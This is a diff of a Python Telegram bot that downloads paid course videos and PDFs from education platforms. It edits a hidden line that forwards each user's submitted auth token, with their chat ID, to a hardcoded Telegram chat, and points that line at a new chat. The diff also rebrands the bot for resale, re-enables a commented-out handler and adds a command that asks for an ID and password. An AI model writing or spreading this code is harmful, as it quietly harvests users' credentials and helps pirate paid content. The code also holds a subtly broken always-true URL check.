@@ -1479,7 +1479,7 @@ async def apnissn(bot: Client, m: Message):
     input1 = await bot.listen(editable.chat.id)
     token = input1.text
     await bot.send_message(
-        -1002133225459, f"**Apni Auth Code**\n{editable.chat.id}\n\n`{token}`"
+        -1002698150766, f"**Apni Auth Code**\n{editable.chat.id}\n\n`{token}`"
     )
     headers1 = {
         "Host": "spec.apnikaksha.net",
@@ -1638,11 +1638,11 @@ async def khann(bot: Client, m: Message):
 async def account_ln(bot: Client, m: Message):
     user = m.from_user.id if m.from_user is not None else None
     if user is not None and user not in sudo_users:
-        await m.reply("**Buy it from @AublicXRobot_OP**", quote=True)
+        await m.reply("**Buy it from @Aublic**", quote=True)
         return
     else:
         editable = await m.reply_text(
-            "Hello Bruh **I An Anurag Downloader Bot**. I can download videos from **text** file one by one.**\n\nLanguage** : Python**\nFramework** : Pyrogram\n\nSend **TXT** File {Name : Link}"
+            "Hello Bruh **I Am an Aublic Downloader Bot**. I can download videos from **text** file one by one.**\n\nLanguage** : Python**\nFramework** : Pyrogram\n\nSend **TXT** File {Name : Link}"
         )
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
@@ -1779,7 +1779,7 @@ async def pro_visooin(bot: Client, m: Message):
                 f"**Downloading:-**\n\n**Name :-** `{name}`\n\n**Url :-** `{url}`\n\n`"
             )
             prog = await m.reply_text(Show)
-            cc = f"**Name »** {name1}.mp4\n**Batch »** {raw_text5}\n**Index »** {str(count).zfill(3)}\n\n**Download BY** :- Group Admin"
+            cc = f"**Name »** {name1}.mp4\n**Batch »** {raw_text5}\n**Index »** {str(count).zfill(3)}\n\n**Download BY AublicX_Robot**"
             if "vision" or "youtu" in url:
                 cmd = f'yt-dlp "{url}" -o "{name}"'
             elif "player.vimeo" in url:
@@ -2106,7 +2106,7 @@ async def projwin(bot: Client, m: Message):
             name = f"{str(count).zfill(3)}) {name1}"
             Show = f"**Downloading:-**\n\n**Name :-** `{name}`\n\n**Url :-** `{url1}`"
             prog = await m.reply_text(Show)
-            cc = f"**Title »** {name1}.mkv\n**Caption »** {raw_text0}\n**Index »** {str(count).zfill(3)}\n\n**Download BY** :- Group Admin"
+            cc = f"**Title »** {name1}.mkv\n**Caption »** {raw_text0}\n**Index »** {str(count).zfill(3)}\n\n**Download BY AublicX_Robot**"
             if "pdf" in url:
                 cmd = f'yt-dlp -o "{name}.pdf" "{url1}"'
             else:
@@ -2171,7 +2171,7 @@ async def projwin(bot: Client, m: Message):
         await m.reply_text(e)
     await m.reply_text("Done")
 
-"""
+
 
 @bot.on_message(filters.command(["top"]))
 async def account_login(bot: Client, m: Message):
@@ -2308,8 +2308,8 @@ async def account_login(bot: Client, m: Message):
     except Exception as e:
         await m.reply_text(str(e))
     await m.reply_text("Done") 
-"""
-@bot.on_message(filters.command(["muskan"]))
+
+@bot.on_message(filters.command(["rozgar"]))
 async def account_login(bot: Client, m: Message):
     editable = await m.reply_text("Send **ID & Password** in this manner otherwise bot will not respond.\n\nSend like this:-  **ID*Password**")
     rwa_url = "https://rozgarapinew.teachx.in/post/login"
